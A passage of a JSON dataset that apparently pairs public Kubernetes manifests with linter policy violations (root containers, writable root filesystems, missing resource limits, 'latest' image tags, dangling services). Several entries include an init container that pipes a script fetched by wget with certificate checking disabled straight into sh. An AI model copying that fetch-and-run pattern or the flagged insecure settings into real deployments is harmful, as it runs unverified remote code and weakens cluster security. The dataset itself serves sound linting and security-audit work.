    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ksql-datagen-users\" does not have a read-only root file system"
  },
  {
    "id": "3177",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ksql\" is not set to runAsNonRoot"
  },
  {
    "id": "3178",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ksql-datagen-pageviews\" is not set to runAsNonRoot"
  },
  {
    "id": "3179",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ksql-datagen-users\" is not set to runAsNonRoot"
  },
  {
    "id": "3180",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ksql\" has cpu request 0"
  },
  {
    "id": "3181",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ksql-datagen-pageviews\" has cpu request 0"
  },
  {
    "id": "3182",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ksql-datagen-users\" has cpu request 0"
  },
  {
    "id": "3183",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ksql\" has memory limit 0"
  },
  {
    "id": "3184",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ksql-datagen-pageviews\" has memory limit 0"
  },
  {
    "id": "3185",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ksql-datagen-users\" has memory limit 0"
  },
  {
    "id": "3186",
    "manifest_path": "data/manifests/the_stack_sample/sample_0964.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alexeyyakovlev1982/hipster_shop_paymentservice_v0.0.2\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server\" is using an invalid container image, \"alexeyyakovlev1982/hipster_shop_paymentservice_v0.0.2\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3187",
    "manifest_path": "data/manifests/the_stack_sample/sample_0964.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alexeyyakovlev1982/hipster_shop_paymentservice_v0.0.2\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3188",
    "manifest_path": "data/manifests/the_stack_sample/sample_0964.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alexeyyakovlev1982/hipster_shop_paymentservice_v0.0.2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "3189",
    "manifest_path": "data/manifests/the_stack_sample/sample_0964.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alexeyyakovlev1982/hipster_shop_paymentservice_v0.0.2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "3190",
    "manifest_path": "data/manifests/the_stack_sample/sample_0964.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alexeyyakovlev1982/hipster_shop_paymentservice_v0.0.2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "3191",
    "manifest_path": "data/manifests/the_stack_sample/sample_0964.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alexeyyakovlev1982/hipster_shop_paymentservice_v0.0.2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "3192",
    "manifest_path": "data/manifests/the_stack_sample/sample_0966.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-k8s-pod\n  labels:\n    app: demo-k8s\nspec:\n  containers:\n  - name: demok8s\n    image: karatejb/demo-k8s:latest\n    ports:\n    - containerPort: 5000\n    - containerPort: 5001\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"demok8s\" is using an invalid container image, \"karatejb/demo-k8s:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3193",
    "manifest_path": "data/manifests/the_stack_sample/sample_0966.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-k8s-pod\n  labels:\n    app: demo-k8s\nspec:\n  containers:\n  - name: demok8s\n    image: karatejb/demo-k8s:latest\n    ports:\n    - containerPort: 5000\n    - containerPort: 5001\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"demok8s\" does not have a read-only root file system"
  },
  {
    "id": "3194",
    "manifest_path": "data/manifests/the_stack_sample/sample_0966.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-k8s-pod\n  labels:\n    app: demo-k8s\nspec:\n  containers:\n  - name: demok8s\n    image: karatejb/demo-k8s:latest\n    ports:\n    - containerPort: 5000\n    - containerPort: 5001\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"demok8s\" is not set to runAsNonRoot"
  },
  {
    "id": "3195",
    "manifest_path": "data/manifests/the_stack_sample/sample_0966.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-k8s-pod\n  labels:\n    app: demo-k8s\nspec:\n  containers:\n  - name: demok8s\n    image: karatejb/demo-k8s:latest\n    ports:\n    - containerPort: 5000\n    - containerPort: 5001\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"demok8s\" has cpu request 0"
  },
  {
    "id": "3196",
    "manifest_path": "data/manifests/the_stack_sample/sample_0966.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-k8s-pod\n  labels:\n    app: demo-k8s\nspec:\n  containers:\n  - name: demok8s\n    image: karatejb/demo-k8s:latest\n    ports:\n    - containerPort: 5000\n    - containerPort: 5001\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"demok8s\" has memory limit 0"
  },
  {
    "id": "3197",
    "manifest_path": "data/manifests/the_stack_sample/sample_0968.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: inlets\n  labels:\n    app: inlets\nspec:\n  type: ClusterIP\n  ports:\n  - name: tunnel\n    port: 9090\n    protocol: TCP\n    targetPort: 9090\n  - name: public\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: inlets\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:inlets])"
  },
  {
    "id": "3198",
    "manifest_path": "data/manifests/the_stack_sample/sample_0969.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: helloworld-service\nspec:\n  ports:\n  - port: 31001\n    nodePort: 31001\n    targetPort: nodejs-port\n    protocol: TCP\n  selector:\n    app: helloworld\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:helloworld])"
  },
  {
    "id": "3199",
    "manifest_path": "data/manifests/the_stack_sample/sample_0970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: scum-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      kind: scum\n  template:\n    metadata:\n      labels:\n        kind: scum\n    spec:\n      containers:\n      - name: scum-pod\n        image: ihippik/k8s-scum:main\n        args:\n        - server\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3200",
    "manifest_path": "data/manifests/the_stack_sample/sample_0970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: scum-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      kind: scum\n  template:\n    metadata:\n      labels:\n        kind: scum\n    spec:\n      containers:\n      - name: scum-pod\n        image: ihippik/k8s-scum:main\n        args:\n        - server\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"scum-pod\" does not have a read-only root file system"
  },
  {
    "id": "3201",
    "manifest_path": "data/manifests/the_stack_sample/sample_0970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: scum-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      kind: scum\n  template:\n    metadata:\n      labels:\n        kind: scum\n    spec:\n      containers:\n      - name: scum-pod\n        image: ihippik/k8s-scum:main\n        args:\n        - server\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"scum-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "3202",
    "manifest_path": "data/manifests/the_stack_sample/sample_0970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: scum-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      kind: scum\n  template:\n    metadata:\n      labels:\n        kind: scum\n    spec:\n      containers:\n      - name: scum-pod\n        image: ihippik/k8s-scum:main\n        args:\n        - server\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"scum-pod\" has cpu request 0"
  },
  {
    "id": "3203",
    "manifest_path": "data/manifests/the_stack_sample/sample_0970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: scum-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      kind: scum\n  template:\n    metadata:\n      labels:\n        kind: scum\n    spec:\n      containers:\n      - name: scum-pod\n        image: ihippik/k8s-scum:main\n        args:\n        - server\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"scum-pod\" has memory limit 0"
  },
  {
    "id": "3204",
    "manifest_path": "data/manifests/the_stack_sample/sample_0971.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-exporter\n  labels:\n    app: prow-exporter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-exporter\n  template:\n    metadata:\n      labels:\n        app: prow-exporter\n    spec:\n      serviceAccountName: prow-exporter\n      containers:\n      - name: prow-exporter\n        image: gcr.io/k8s-prow/exporter:v20211028-7017c540b0\n        imagePullPolicy: Always\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: healthz\n          containerPort: 8081\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          timeoutSeconds: 15\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          timeoutSeconds: 15\n        resources:\n          requests:\n            cpu: 100m\n            memory: 500Mi\n          limits:\n            cpu: 100m\n            memory: 500Mi\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prow-exporter\" does not have a read-only root file system"
  },
  {
    "id": "3205",
    "manifest_path": "data/manifests/the_stack_sample/sample_0971.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-exporter\n  labels:\n    app: prow-exporter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-exporter\n  template:\n    metadata:\n      labels:\n        app: prow-exporter\n    spec:\n      serviceAccountName: prow-exporter\n      containers:\n      - name: prow-exporter\n        image: gcr.io/k8s-prow/exporter:v20211028-7017c540b0\n        imagePullPolicy: Always\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: healthz\n          containerPort: 8081\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          timeoutSeconds: 15\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          timeoutSeconds: 15\n        resources:\n          requests:\n            cpu: 100m\n            memory: 500Mi\n          limits:\n            cpu: 100m\n            memory: 500Mi\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-exporter\" not found"
  },
  {
    "id": "3206",
    "manifest_path": "data/manifests/the_stack_sample/sample_0971.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-exporter\n  labels:\n    app: prow-exporter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-exporter\n  template:\n    metadata:\n      labels:\n        app: prow-exporter\n    spec:\n      serviceAccountName: prow-exporter\n      containers:\n      - name: prow-exporter\n        image: gcr.io/k8s-prow/exporter:v20211028-7017c540b0\n        imagePullPolicy: Always\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: healthz\n          containerPort: 8081\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          timeoutSeconds: 15\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          timeoutSeconds: 15\n        resources:\n          requests:\n            cpu: 100m\n            memory: 500Mi\n          limits:\n            cpu: 100m\n            memory: 500Mi\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prow-exporter\" is not set to runAsNonRoot"
  },
  {
    "id": "3207",
    "manifest_path": "data/manifests/the_stack_sample/sample_0973.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged\n  labels:\n    app: privileged\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: privileged\n      labels:\n        app: privileged\n    spec:\n      containers:\n      - name: test\n        image: e2eteam/busybox:1.29-windows-amd64-1809\n        command:\n        - cmd\n        - /c\n        - ping -t localhost\n        resources:\n          limits:\n            cpu: 1\n            memory: 800m\n          requests:\n            cpu: '0.1'\n            memory: 300m\n  selector:\n    matchLabels:\n      app: privileged\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test\" does not have a read-only root file system"
  },
  {
    "id": "3208",
    "manifest_path": "data/manifests/the_stack_sample/sample_0973.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged\n  labels:\n    app: privileged\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: privileged\n      labels:\n        app: privileged\n    spec:\n      containers:\n      - name: test\n        image: e2eteam/busybox:1.29-windows-amd64-1809\n        command:\n        - cmd\n        - /c\n        - ping -t localhost\n        resources:\n          limits:\n            cpu: 1\n            memory: 800m\n          requests:\n            cpu: '0.1'\n            memory: 300m\n  selector:\n    matchLabels:\n      app: privileged\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test\" is not set to runAsNonRoot"
  },
  {
    "id": "3209",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web\" is using an invalid container image, \"alsam/alex:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3210",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-web\" does not have a read-only root file system"
  },
  {
    "id": "3211",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "3212",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-web\" is not set to runAsNonRoot"
  },
  {
    "id": "3213",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "3214",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
